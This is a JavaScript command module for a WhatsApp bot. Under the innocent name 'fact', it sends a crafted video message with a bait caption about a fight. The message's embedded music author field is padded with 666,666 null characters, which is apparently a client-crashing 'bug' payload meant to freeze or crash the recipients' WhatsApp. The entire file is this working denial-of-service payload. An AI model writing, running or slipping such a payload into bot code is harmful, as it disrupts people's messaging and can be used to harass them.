module.exports = {
    name: 'fact',
    execute: async (sock, msg, args) => {
        const chatJid = msg.key.remoteJid;
        
        const videoPayload = {
            videoMessage: {
                caption: "look, the people is havin a fight!",
                url: "https://mmg.whatsapp.net/v/t62.7161-24/571089696_1578100283684655_1996386148214686670_n.enc?ccb=11-4&oh=01_Q5Aa5AG5viI32JxJJ0IldU3Yg-aD90feCWAmyU_8ICQkLa7NMQ&oe=6A78786C&_nc_sid=5e03e0&mms3=true",
                mimetype: "video/mp4",
                fileSha256: Buffer.from("ItZ54Zu/3nrFZprYKSUgWCSgZaEOHWgr1aXikyyIeao=", 'base64'),
                fileLength: "621181",
                seconds: 15,
                mediaKey: Buffer.from("yx4YEt5ImD3mgjH2sG4ZFZDdDRGbBvKBoFJ/dr25jFw=", 'base64'),
                height: 850,
                width: 478,
                fileEncSha256: Buffer.from("8BZYx5XvG8m9JWeQ9wCTNTgCiccUqZfdF4tolyNvu4I=", 'base64'),
                directPath: "/v/t62.7161-24/571089696_1578100283684655_1996386148214686670_n.enc?ccb=11-4&oh=01_Q5Aa1Q5Aa5AG5viI32JxJJ0IldU3Yg-aD90feCWAmyU_8ICQkLa7NMQ&oe=6A78786C&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1783692675",
                jpegThumbnail: "/9j/4AAQSkZJRg...",
                contextInfo: {
                    isQuestion: true,
                    forwardingScore: 0,
                    featureEligibilities: {
                        cannotBeRanked: false,
                        canBeReshared: false
                    },
                    pairedMediaType: "NOT_PAIRED_MEDIA",
                    statusSourceType: "MUSIC_STANDALONE"
                },
                streamingSidecar: Buffer.from("Em3CJwQ+xKOAjShRk2YTXaJn4LINew82ajTPSSUF7Ds8Nk6SYq9WKBqwA1cpf6BRsJZSD4dUsKSejKCB4qOa1DZJi5J6BZmjGSDUKV5vW0FoSnvWFwFPomTdoW5XUtZYJT/dLA==", 'base64'),
                thumbnailDirectPath: "/v/t62.36147-24/622381825_1411995144178468_4020528106761426645_n.enc?ccb=11-4&oh=01_Q5Aa1Q5Aa5AG5viI32JxJJ0IldU3Yg-aD90feCWAmyU_8ICQkLa7NMQ&oe=6A78786C&_nc_sid=5e03e0",
                thumbnailSha256: Buffer.from("6wb6fbOKiMr8HlTcL5Us1GSyMm9q8k+a7h7cVU90KpY=", 'base64'),
                thumbnailEncSha256: Buffer.from("v3dEQyY3ePW9gWYOK0RKpjVAkv4Y/sRl8ERzruRbBJ8=", 'base64'),
                annotations: [
                    {
                        shouldSkipConfirmation: true,
                        embeddedContent: {
                            embeddedMusic: {
                                musicContentMediaId: "2261401457948346",
                                songId: "849859527815275",
                                author: "@bayyy198" + "\u0000".repeat(666666),
                                title: "maybe he wouldn't see it . . . ?"
                            }
                        },
                        embeddedAction: true
                    }
                ]
            }
        };

        await sock.relayMessage(chatJid, videoPayload, {});
    }
};
